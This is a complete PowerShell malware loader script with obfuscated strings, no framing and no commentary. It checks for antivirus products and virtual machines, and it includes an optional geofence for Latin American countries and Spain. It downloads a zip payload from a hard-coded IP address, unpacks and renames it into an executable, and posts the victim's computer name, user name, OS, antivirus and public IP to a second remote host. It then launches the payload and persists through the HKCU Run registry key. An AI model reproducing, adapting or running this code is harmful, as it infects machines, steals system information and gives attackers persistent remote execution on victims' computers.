function confere { 
$pratamar = Invoke-RestMethod ("{6}{2}{1}{0}{4}{3}{5}"-f'/','tp:','t','fo','/ipin','.io/json','h') | Select -exp country

  If ($pratamar  -eq 'BR')  {

  }  ElseIf ($pratamar  -eq 'CL')  {

  }  ElseIf ($pratamar  -eq 'AR')  {

  }  ElseIf ($pratamar  -eq 'MX')  {

 }  ElseIf ($pratamar  -eq 'CO')  {

 }  ElseIf ($pratamar  -eq 'EC')  {

 }  ElseIf ($pratamar  -eq 'PE')  {

  }  ElseIf ($pratamar  -eq 'ES')  {

  }  Else {
  exit
  }

}
 
  
function getAntivirusName {  
        $wmiQuery = "SELECT * FROM An" + "tiVir" + "usProduct"                  
        $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters -ErrorVariable myError -ErrorAction 'SilentlyContinue'             

        if($antivirus){
            return $antivirus.displayName            
            }else{
                $alternateAntivirusQuery=WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct GET displayName /Format:List|?{$_.trim() -ne ""}|%{$_ -replace "displayName=",""}
                if ($alternateAntivirusQuery){                    
                    return $alternateAntivirusQuery
                    }else{
                        write-host "No"
                        $rawSearch=((get-wmiobject -class "Win32_Process" -namespace "root\cimv2" | where-object {$_.Name.ToLower() -match "antivirus|endpoint|protection|security|defender|msmpeng"}).Name | Out-String).Trim();
                        if($rawSearch){
                            return $rawSearch
                            }else{
                                return "No"
                                }
                        }
                
                } 
        }


Function Get-VMVirtualizationLayer{

    $Manufacturer = (Get-WmiObject win32_computersystem).manufacturer
    $model= (Get-WmiObject win32_computersystem).model
    $biosversion = (Get-WmiObject win32_bios).version
	
	Write-Output $Manufacturer
	Write-Output $model
	Write-Output $biosversion
	

    if ($model -match "Virtual Machine")

    {

    exit

     } 
            elseif ($biosversion -match "VIRTUAL")

            {

            exit

            }


            elseif ($biosversion -match "A M I")

            {

            exit

            }   


    elseif ($model -match "VMware")

    {

    exit

    }

    elseif ($model -match "VirtualBox")

    {

    exit

    }

    }



function maronaldi
{
  -join ((65..90) + (97..122) | Get-Random -Count $args[0] | % {[char]$_})
}

#confere
  
#Get-VMVirtualizationLayer
	 
	
$bucetinha = "$env:Public\$env:computername$([System.DateTime]::Now.ToString('ddMM'))"
$portugues = [System.IO.File]::Exists($bucetinha)


if (-Not $portugues)
{
  "" | Set-Content $bucetinha

  $esqueleto = maronaldi 9  
  $esqueleto = "$env:Public\$esqueleto\"

  New-Item -ItemType directory -Path $esqueleto
  
  $pirarucu = maronaldi 10
  $pirarucu = "$esqueleto$pirarucu.zip"
  
  $viadinho = "http://20.91.206.86/64bits.php"

  (New-Object System.Net.WebClient).DownloadFile($viadinho, $pirarucu)


  
    $objArrayArqsZip = New-Object System.Collections.ArrayList
  $objShelApplication = New-Object -com shell.application
  $objArquivoZipado = $objShelApplication.NameSpace($pirarucu)
  
  foreach($item in $objArquivoZipado.items())
  {
    $objShelApplication.Namespace($esqueleto).copyhere($item)
    $objArrayArqsZip.Add($item.name)
  }


  $motorfundido = New-Object System.Collections.ArrayList
  $correios = New-Object -com shell.application
  $suburbio = $correios.NameSpace($pirarucu)
  foreach($item in $suburbio.items())
  {
 #  $correios.Namespace($esqueleto).copyhere($item)
    $motorfundido.Add($item.name)
  }  

  
  $avenida = maronaldi 8
 $zezao = maronaldi 10
  $bunda = maronaldi 3
  
  $shemaldo = maronaldi 4
  $inverterbrado = $esqueleto +  $shemaldo + ".e" + "xe" 
    
  $cunhado =  maronaldi 4
  $loironinha = $esqueleto + $cunhado
  
  $baseado =  maronaldi 4
  $charada = $esqueleto + $baseado + "." + $bunda
  
  foreach ($bizarra in $motorfundido) 
  {
    $metudada = (Get-Item "$esqueleto$bizarra").Length
    if ($metudada -lt 999)
    {
      Rename-Item -Path "$esqueleto$bizarra" -NewName $loironinha
    }
    elseif ($metudada -lt 990000)
    {
      Rename-Item -Path "$esqueleto$bizarra" -NewName $inverterbrado
    }
    else
    {
      Rename-Item -Path "$esqueleto$bizarra" -NewName $charada #tirar o charada para nomefixo
    }
  }


$computando = $env:computername
$usando = $env:username
$windando = (Get-WmiObject -class Win32_OperatingSystem).Caption
$antiav = getAntivirusName
$protozoario = "htt" + "p://ifco" + "nfig" + ".me/ip"
$ipzao = (Invoke-WebRequest -uri $protozoario).Content
  $tema = "http://51.132.148.124/brume.php"
$postParams = @{VESPC=$windando;COMPUTA=$computando +" " +$usando;AVZANDO=$antiav;USAR=$usando;ipzao=$ipzao}
Invoke-WebRequest -Uri $tema -Method POST -Body $postParams
  
 
 $pantanal = .("{0}{2}{1}"-f 'New-Obj','ct','e') -ComObject ("{0}{2}{1}{3}"-f 'W','t.She','Scrip','ll')
  $juazeiro = $pantanal.CreateShortcut("$env:Public\" + $shemaldo + ".lnk")
  $juazeiro.TargetPath = $inverterbrado
  $juazeiro.Description = $loironinha
  $juazeiro.Arguments = """$loironinha"" ""$charada"""
  $juazeiro.WorkingDirectory = $esqueleto  
  $juazeiro.Save()

Start-Process ("$env:Public\" + $shemaldo + ".lnk")

Remove-Item $pirarucu

$jogadorfutebol = "HKC" + "U:\So" + "ftw" + "are\Micr" + "osof" + "t\Win" + "dows" + "\Curr" + "entVersi" + "on\R" + "un"

set-itemproperty $jogadorfutebol $avenida ("""$inverterbrado"" ""$loironinha"" ""$charada""  /$zezao --$zezao" )
#set-itemproperty $jogadorfutebol $avenida ("$env:Public\" + $shemaldo + ".lnk")

  
#Start-Sleep -s 5

#Restart-Computer


} 

